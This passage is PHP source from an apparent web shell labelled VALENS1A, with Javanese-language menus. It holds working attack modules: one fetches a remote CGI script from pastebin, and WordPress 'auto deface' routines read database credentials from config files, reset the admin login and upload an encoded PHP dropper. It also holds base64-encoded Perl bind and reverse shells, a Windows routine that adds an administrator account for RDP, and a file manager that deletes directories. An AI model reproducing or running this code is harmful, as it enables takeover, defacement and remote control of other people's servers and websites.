$cgi_dir = mkdir('valens1a_cgi', 0755);
$file_cgi = "valens1a_cgi/cgi.izo";
$isi_htcgi = "AddHandler cgi-script .izo";
$htcgi = fopen(".htaccess", "w");
fwrite($htcgi, $isi_htcgi);
fclose($htcgi);
$cgi_script = getsource("http://pastebin.com/raw/Lj46KxFT");
$cgi = fopen($file_cgi, "w");
fwrite($cgi, $cgi_script);
fclose($cgi);
chmod($file_cgi, 0755);
echo "<iframe src='valens1a_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['ochill_valens1a'] == 'fake_root') {
ob_start();
$cwd = getcwd();
$ambil_user = explode("/", $cwd);
$user = $ambil_user[2];
if($_POST['reverse']) {
$site = explode("\r\n", $_POST['url']);
$file = $_POST['file'];
foreach($site as $url) {
$cek = getsource("$url/~$user/$file");
if(preg_match("/hacked/i", $cek)) {
echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
}
}
} else {
echo "<center><form method='post'>
Jeneng Sempak: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
Domain: <br>
<textarea style='width: 450px; height: 250px;' name='url'>";
reverse($_SERVER['HTTP_HOST']);
echo "</textarea><br>
<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
</form><br>
<font color=lime>WOCOEN SEK: </font><font color=white>Sedurunge gunakno Tools Iki, Upload sek file defacean mu nang dir /home/user/ dan /home/user/public_html.</font></center>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'adminer') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
function adminer($url, $isi) {
$fp = fopen($isi, "w");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FILE, $fp);
return curl_exec($ch);
curl_close($ch);
fclose($fp);
ob_flush();
flush();
}
if(file_exists('adminer.php')) {
echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> Mbobol kamar seng nduwe <-</a></font></center>";
} else {
if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> Mbobol Kamar <-</a></font></center>";
} else {
echo "<center><font color=red>Gagal buka sempake wonge seng nduwe.</font></center>";
}
}
} elseif($_GET['ochill_valens1a'] == 'auto_dwp') {
if($_POST['auto_deface_wp']) {
function anucurl($sites) {
$ch = curl_init($sites);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
function lohgin($cek, $web, $userr, $pass, $wp_submit) {
$post = array(
"log" => "$userr",
"pwd" => "$pass",
"rememberme" => "forever",
"wp-submit" => "$wp_submit",
"redirect_to" => "$web",
"valens1acookie" => "1",
);
$ch = curl_init($cek);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
$scan = $_POST['link_config'];
$link_config = scandir($scan);
$script = htmlspecialchars($_POST['script']);
$user = "ochillroot";
$pass = "rootochill";
$passx = md5($pass);
foreach($link_config as $dir_config) {
if(!is_file("$scan/$dir_config")) continue;
$config = file_get_contents("$scan/$dir_config");
if(preg_match("/WordPress/", $config)) {
$dbhost = ambilkata($config,"DB_HOST', '","'");
$dbuser = ambilkata($config,"DB_USER', '","'");
$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
$dbname = ambilkata($config,"DB_NAME', '","'");
$dbprefix = ambilkata($config,"table_prefix = '","'");
$prefix = $dbprefix."users";
$option = $dbprefix."options";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result[ID];
$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
$result2 = mysql_fetch_array($q2);
$target = $result2[option_value];
if($target == '') {
echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
} else {
echo "[+] $target <br>";
}
$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
if(!$conn OR !$db OR !$update) {
echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
mysql_close($conn);
} else {
$site = "$target/wp-login.php";
$site2 = "$target/wp-admin/theme-install.php?upload";
$b1 = anucurl($site2);
$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
$b = lohgin($site, $site2, $user, $pass, $wp_sub);
$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$upload3);
$post2 = array(
"_wpnonce" => "$anu2",
"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
"themezip" => "@$www",
"install-theme-submit" => "Install Now",
);
$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
$data3 = curl_exec($ch);
curl_close($ch);
$y = date("Y");
$m = date("m");
$namafile = "id.php";
$fpi = fopen($namafile,"w");
fputs($fpi,$script);
$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
$postResult = curl_exec($ch6);
curl_close($ch6);
$as = "$target/k.php";
$bs = anucurl($as);
if(preg_match("#$script#is", $bs)) {
echo "[+] <font color='lime'>Berhasil Deface Mas...</font><br>";
echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
} else {
echo "[-] <font color='red'>Gagal Mas (Gausah patah semanagat yaa)...</font><br>";
echo "[!!] coba aja manual: <br>";
echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
}
}
}
} else {
echo "<center><h1>WordPress Auto Deface</h1>
<form method='post'>
<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
<input type='text' name='script' height='10' size='50' placeholder='Hacked by VALENS1A' required><br>
<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Crootzz PerawanNya!!!'>
</form>
<br><span><font color=lime>WOCOEN SEK: </font><font color=white>Tools iki work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</font></span>
</center>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'auto_dwp2') {
if($_POST['auto_deface_wp']) {
function anucurl($sites) {
$ch = curl_init($sites);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION,true);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
function lohgin($cek, $web, $userr, $pass, $wp_submit) {
$post = array(
"log" => "$userr",
"pwd" => "$pass",
"rememberme" => "forever",
"wp-submit" => "$wp_submit",
"redirect_to" => "$web",
"valens1acookie" => "1",
);
$ch = curl_init($cek);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
$link = explode("\r\n", $_POST['link']);
$script = htmlspecialchars($_POST['script']);
$user = "ochillroot";
$pass = "rootochill";
$passx = md5($pass);
foreach($link as $dir_config) {
$config = anucurl($dir_config);
$dbhost = ambilkata($config,"DB_HOST', '","'");
$dbuser = ambilkata($config,"DB_USER', '","'");
$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
$dbname = ambilkata($config,"DB_NAME', '","'");
$dbprefix = ambilkata($config,"table_prefix = '","'");
$prefix = $dbprefix."users";
$option = $dbprefix."options";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result[ID];
$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
$result2 = mysql_fetch_array($q2);
$target = $result2[option_value];
if($target == '') {
echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
} else {
echo "[+] $target <br>";
}
$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
if(!$conn OR !$db OR !$update) {
echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
mysql_close($conn);
} else {
$site = "$target/wp-login.php";
$site2 = "$target/wp-admin/theme-install.php?upload";
$b1 = anucurl($site2);
$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
$b = lohgin($site, $site2, $user, $pass, $wp_sub);
$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$upload3);
$post2 = array(
"_wpnonce" => "$anu2",
"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
"themezip" => "@$www",
"install-theme-submit" => "Install Now",
);
$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
$data3 = curl_exec($ch);
curl_close($ch);
$y = date("Y");
$m = date("m");
$namafile = "id.php";
$fpi = fopen($namafile,"w");
fputs($fpi,$script);
$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
$postResult = curl_exec($ch6);
curl_close($ch6);
$as = "$target/k.php";
$bs = anucurl($as);
if(preg_match("#$script#is", $bs)) {
echo "[+] <font color='lime'>Berhasil Deface Mas...</font><br>";
echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
} else {
echo "[-] <font color='red'>Gagal Mas (Semangat mas)...</font><br>";
echo "[!!] coba aja manual: <br>";
echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
}
}
} else {
echo "<center><h1>WordPress Auto Deface V.2</h1>
<form method='post'>
Link Config: <br>
<textarea name='link' placeholder='http://target.com/valens1a_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
<input type='text' name='script' height='10' size='50' placeholder='Hacked by VALENS1A' required><br>
<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Crootzz PerawanNya!!'>
</form></center>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'network') {
echo "<form method='post'>
<u>Bind Port:</u> <br>
PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
<input type='submit' name='sub_bp' value='>>'>
</form>
<form method='post'>
<u>Back Connect:</u> <br>
Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
<input type='submit' name='sub_bc' value='>>'>
</form>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
if(isset($_POST['sub_bp'])) {
$f_bp = fopen("/tmp/bp.pl", "w");
fwrite($f_bp, base64_decode($bind_port_p));
fclose($f_bp);

$port = $_POST['port_bind'];
$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("/tmp/bp.pl");
}
$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
if(isset($_POST['sub_bc'])) {
$f_bc = fopen("/tmp/bc.pl", "w");
fwrite($f_bc, base64_decode($bind_connect_p));
fclose($f_bc);

$ipbc = $_POST['ip_bc'];
$port = $_POST['port_bc'];
$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("/tmp/bc.pl");
}
} elseif($_GET['ochill_valens1a'] == 'krdp_shell') {
if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
if($_POST['create']) {
$user = htmlspecialchars($_POST['user']);
$pass = htmlspecialchars($_POST['pass']);
if(preg_match("/$user/", exe("net user"))) {
echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
} else {
$add_user = exe("net user $user $pass /add");
$add_groups1 = exe("net localgroup Administrators $user /add");
$add_groups2 = exe("net localgroup Administrator $user /add");
$add_groups3 = exe("net localgroup Administrateur $user /add");
echo "[ RDP ACCOUNT INFO ]<br>
------------------------------<br>
IP : <font color=lime>".$ip."</font><br>
Username : <font color=lime>$user</font><br>
Password : <font color=lime>$pass</font><br>
Pesan : <font color=limegreen>RDP Dari VALENS1A</font><br>
------------------------------<br><br>
[ STATUS ]<br>
------------------------------<br>
";
if($add_user) {
echo "[add user] -> <font color='lime'>Berhasil</font><br>";
} else {
echo "[add user] -> <font color='red'>Gagal</font><br>";
}
if($add_groups1) {
echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
} elseif($add_groups2) {
echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
} elseif($add_groups3) {
echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
} else {
echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
}
echo "------------------------------<br>";
}
} elseif($_POST['s_opsi']) {
$user = htmlspecialchars($_POST['r_user']);
if($_POST['opsi'] == '1') {
$cek = exe("net user $user");
echo "Checking username <font color=lime>$user</font> ....... ";
if(preg_match("/$user/", $cek)) {
echo "[ <font color=lime>Sudah ada</font> ]<br>
------------------------------<br><br>
<pre>$cek</pre>";
} else {
echo "[ <font color=red>Belum ada</font> ]";
}
} elseif($_POST['opsi'] == '2') {
$cek = exe("net user $user ochillroot");
if(preg_match("/$user/", exe("net user"))) {
echo "[change password: <font color=lime>rootochill</font>] -> ";
if($cek) {
echo "<font color=lime>Berhasil</font>";
} else {
echo "<font color=red>Gagal</font>";
}
} else {
echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
}
} elseif($_POST['opsi'] == '3') {
$cek = exe("net user $user /DELETE");
if(preg_match("/$user/", exe("net user"))) {
echo "[remove user: <font color=lime>$user</font>] -> ";
if($cek) {
echo "<font color=lime>Berhasil</font>";
} else {
echo "<font color=red>Gagal</font>";
}
} else {
echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
}
} else {
//
}
} else {
echo "-- Create RDP --<br>
<form method='post'>
<input type='text' name='user' placeholder='username' value='ochillroot' required>
<input type='text' name='pass' placeholder='password' value='rootochill' required>
<input type='submit' name='create' value='>>'>
</form>
-- Option --<br>
<form method='post'>
<input type='text' name='r_user' placeholder='username' required>
<select name='opsi'>
<option value='1'>Cek Username</option>
<option value='2'>Ganti Password</option>
<option value='3'>Busek Username</option>
</select>
<input type='submit' name='s_opsi' value='>>'>
</form>
";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} else {
echo "<font color=red>Fitur iki cuma isok digawe nang Windows Server tok.</font>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['act'] == 'newfile') {
if($_POST['new_save_file']) {
$newfile = htmlspecialchars($_POST['newfile']);
$fopen = fopen($newfile, "a+");
if($fopen) {
$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
} else {
$act = "<font color=red>Izinmu Ditolak Cok.</font>";
}
}
echo $act;
echo "<form method='post'>
Jeneng Sempak: <input type='text' name='newfile' value='$dir/ngaweanak.php' style='width: 450px;' height='10'>
<input type='submit' name='new_save_file' value='Simpen.'>
</form>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'newfolder') {
if($_POST['new_save_folder']) {
$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
if(!mkdir($new_folder)) {
$act = "<font color=red>Izinmu Ditolak Cok.</font>";
} else {
$act = "<script>window.location='?dir=".$dir."';</script>";
}
}
echo $act;
echo "<form method='post'>
Jeneng Paggone Sempak: <input type='text' name='newfolder' style='width: 450px;' height='10'>
<input type='submit' name='new_save_folder' value='Simpen.'>
</form>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'rename_dir') {
if($_POST['dir_rename']) {
$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
if($dir_rename) {
$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
} else {
$act = "<font color=red>Izinmu Ditolak Cok.</font>";
}
echo "".$act."<br>";
}
echo "<form method='post'>
<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
<input type='submit' name='dir_rename' value='Simpen.'>
</form>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Gasido Ganti Jenenge ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'delete_dir') {
if(is_dir($dir)) {
if(is_writable($dir)) {
@rmdir($dir);
@exe("rm -rf $dir");
@exe("rmdir /s /q $dir");
$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
} else {
$act = "<font color=red>Ga Isok Dihapus ".basename($dir)."</font>";
}
}
echo $act;
} elseif($_GET['act'] == 'view') {
echo "Jeneng Sempak: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>Deloken</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>Dipacaki</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>Ganti Jenenge</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Dijumuk</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Busek</a> ]<br>";
echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'edit') {
if($_POST['save']) {
$save = file_put_contents($_GET['file'], $_POST['src']);
if($save) {
$act = "<font color=lime>Isi Sempak Uwes Di Simpen.</font>";
} else {
$act = "<font color=red>Izinmu Ditolak Cok...</font>";
}
echo "".$act."<br>";
}
echo "Jeneng Sempak: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>Deloken</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>Dipacaki</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>Ganti Jenenge</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Dijumuk</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Busek</a> ]<br>";
echo "<form method='post'>
<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
<input type='submit' value='Simpen.' name='save' style='width: 500px;'>
</form>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Mbalek ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'rename') {
if($_POST['do_rename']) {
$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
if($rename) {
$act = "<script>window.location='?dir=".$dir."';</script>";
} else {
$act = "<font color=red>Izinmu Ditolak Cok...</font>";
}
echo "".$act."<br>";
}
echo "Jeneng Sempak: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>Deloken</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>Dipacaki</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>Ganti Jenenge</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>Dijumuk</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>Busek</a> ]<br>";
echo "<form method='post'>
<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
<input type='submit' name='do_rename' value='Simpen.'>
</form>";
echo "<hr><p><a style='color: red;' href='?dir=$dir'>[ Gasido Ganti Jenenge ]</a></center><hr>";

html_footer();
} elseif($_GET['act'] == 'delete') {
$delete = unlink($_GET['file']);
if($delete) {
$act = "<script>window.location='?dir=".$dir."';</script>";
} else {
$act = "<font color=red>Izinmu Ditolak Cok...</font>";
}
echo $act;
} else {
if(is_dir($dir) === true) {
if(!is_readable($dir)) {
echo "<font color=red>Gaisok Bukak Panggone Sempak. ( Ga Iso Diwoco )</font>";
} else {
echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th class="th_home"><center>Isi Sempak</center></th>
<th class="th_home"><center>Tipe Sempak</center></th>
<th class="th_home"><center>Ukurane</center></th>
<th class="th_home"><center>Terakhir Dipacaki</center></th>
<th class="th_home"><center>Jenenge Sengduwe</center></th>
<th class="th_home"><center>Barange Sengduwe</center></th>
<th class="th_home"><center>Olahan</center></th>
</tr>';
$scandir = scandir($dir);
foreach($scandir as $dirx) {
$dtype = filetype("$dir/$dirx");
$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
